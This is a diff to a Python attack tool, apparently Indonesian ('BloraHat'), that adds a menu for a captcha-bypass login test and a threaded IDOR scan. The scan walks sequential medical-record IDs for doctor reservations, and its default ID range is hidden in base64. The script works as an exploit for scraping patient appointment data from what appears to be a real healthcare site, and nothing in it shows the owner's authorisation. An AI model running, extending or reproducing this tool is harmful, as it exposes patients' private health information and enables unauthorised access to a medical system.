@@ -1,7 +1,12 @@
 import requests
 from bs4 import BeautifulSoup
 import base64
+import os
+import sys
 from concurrent.futures import ThreadPoolExecutor
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
 # Internal Core Helper
 def _decode(data):
@@ -72,14 +77,46 @@ def fetch_data(id_num):
         print(f"[\033[91m!\033[0m] RM ID {formatted_id}: Not Found or Error Occurred.")
 
 def start_process(start_range, end_range):
-    show_banner()
     if login():
         print(f"[*] Starting IDOR Scan for Doctor Reservations from range {start_range} to {end_range}...\n")
         with ThreadPoolExecutor(max_workers=10) as executor: # Increased workers for faster scanning
             executor.map(fetch_data, range(start_range, end_range + 1))
         print("\n[*] IDOR Audit Completed for Doctor Reservations.")
 
+def main_menu():
+    while True:
+        clear()
+        show_banner()
+        print(" [1] Auth Test (Captcha Bypass Testing)")
+        print(" [2] IDOR Scan (Input Range Manual)")
+        print(" [3] IDOR Scan (Range Default)")
+        print(" [0] Exit")
+        print("\n")
+        
+        choice = input(" BloraHat > ")
+
+        if choice == '1':
+            login()
+            input("\nTekan Enter untuk kembali ke menu...")
+        elif choice == '2':
+            try:
+                start = int(input("[?] Range Awal: "))
+                end = int(input("[?] Range Akhir: "))
+                start_process(start, end)
+            except ValueError:
+                print("[\033[91m!\033[0m] Error: Input harus berupa angka.")
+            input("\nTekan Enter untuk kembali ke menu...")
+        elif choice == '3':
+            AWAL = int(_decode("NTAwMDAw"))
+            AKHIR = int(_decode("NTEwNTAw"))
+            start_process(AWAL, AKHIR)
+            input("\nTekan Enter untuk kembali ke menu...")
+        elif choice == '0':
+            print("Happy Auditing!")
+            sys.exit()
+        else:
+            print("Pilihan tidak valid.")
+            input("Tekan Enter untuk mencoba lagi...")
+
 if __name__ == "__main__":
-    AWAL = int(_decode("NTAwMDAw"))
-    AKHIR = int(_decode("NTEwNTAw"))
-    start_process(AWAL, AKHIR)
+    main_menu()
